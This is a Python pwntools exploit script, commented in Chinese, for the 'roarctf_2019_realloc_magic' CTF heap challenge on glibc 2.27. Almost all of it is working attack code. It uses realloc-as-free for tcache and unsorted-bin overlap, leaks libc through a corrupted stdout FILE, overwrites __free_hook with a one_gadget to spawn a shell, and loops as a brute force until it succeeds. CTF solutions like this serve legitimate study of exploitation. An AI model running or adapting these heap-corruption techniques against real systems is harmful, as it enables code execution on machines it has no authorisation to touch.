# -*- coding:utf-8 -*-
from PwnContext.core import *

sa = lambda x, y: io.sendafter(x, y)
sl = lambda x: io.sendline(x)
sd = lambda x: io.send(x)
sla = lambda x, y: io.sendlineafter(x, y)
rud = lambda x: io.recvuntil(x, drop=True)
ru = lambda x: io.recvuntil(x, timeout=0.2)

binary = './roarctf_2019_realloc_magic'
debug_libc = './libc-2.27.so'

elf = ELF(binary)
libc = ELF(debug_libc)
ctx.binary = binary
ctx.remote_libc = debug_libc
ctx.debug_remote_libc = True

def lg(s, addr):
    print('\033[1;31;40m%30s-->0x%x\033[0m' % (s, addr))


libc_base, __malloc_hook, system = None, None, None


def magic(offset):
    global libc_base, __malloc_hook, system, __free_hook
    leak = u64(ru("\x7f")[-6:].ljust(8, '\x00'))
    lg('leak', leak)
    libc_base = leak - offset
    lg('base', libc_base)
    __malloc_hook = libc_base + libc.symbols['__malloc_hook']
    __free_hook = libc_base + libc.symbols['__free_hook']
    system = libc_base + libc.symbols['system']


def debug(msg=""):
    pwnlib.gdb.attach(io, msg)


def add(sz, con):
    sla(">>", "1")
    io.sendlineafter("Size?", str(sz))
    sa("?", con)


def free():
    sla(">>", "2")


def magic_():
    sla(">>", "666")


def exploit():


    add(0x70, 'a')
    add(0x0, '')  ##看作清空指针的free
    add(0x100, 'a')
    add(0x0, '')
    add(0xe0, 'a')
    add(0x0, '')
    add(0x100, 'a')
    [free() for i in range(7)]   #将tcache填满
    add(0x0, '')   #再次free产生unsortbin
    add(0x70, 'a')  #填之前的0x70的tcache
    add(0x180, chr(0) * 0x78 + p64(0x41) + '\x60\x57')
    #由于使用的是realloc，会将之前的0x70的chunk调大到0x180，刚好覆盖0x110的unsortbin,后面填充为修改0x110unsortbin的fd
    #造成与unsortbin重叠，然后修改unsortbin的size和fd ,这个41并不造成什么影响
    add(0x0, '')
    add(0x100, 'a')   #用掉heap段的unsortbin
    #gdb.attach(io)
    add(0x0, '')

    add(0x100, p64(0xfbad1887) + p64(0) * 3 + "\x00")  # leak
    # 0xfbad1887  ---stdout.flags
    magic(0x3ed8b0)
    magic_()   #仅仅将bss段的指针清空，并不free

    add(0x70, 'a')
    add(0x0, '')
    add(0x110, 'a')
    add(0x0, '')
    add(0xf0, 'a')
    add(0x0, '')
    add(0x110, 'a')

    [free() for i in range(7)]
    add(0x0, '')
    add(0x70, 'a')

    # debug()
    add(0x190, chr(0) * 0x78 + p64(0x41) + p64(libc_base + 0x3ed8e8)) #__free_hook

    add(0x0, '')

    add(0x110, 'a')
    add(0x0, '')
    lg('__free_hook', __free_hook)

    one_gg = libc_base + 0x4f322
    add(0x110, p64(one_gg))  # leak
    sl("2")
    success(" get shell ")
    io.interactive()


if __name__ == "__main__":
    timesss = 0

    while (True):
        timesss = timesss +1
        print "times:" + hex(timesss)  # 计数器
        io = ctx.start()
        #io = remote("node3.buuoj.cn",29028)
        try:                 #    循环利用异常处理进行爆破
            exploit()
            io.close()
        except Exception as e:   #捕获所有异常
            continue

#  malloc calloc realloc
#  calloc会对申请空间初始化为0，而其他两个不会
#  realloc函数可以重用或扩展以前用 malloc()或 calloc()（或者realloc()）分配的内存。
#  realloc 当传入的chunk不为空，且size为0的情况下，会free掉原chunk并且返回0。
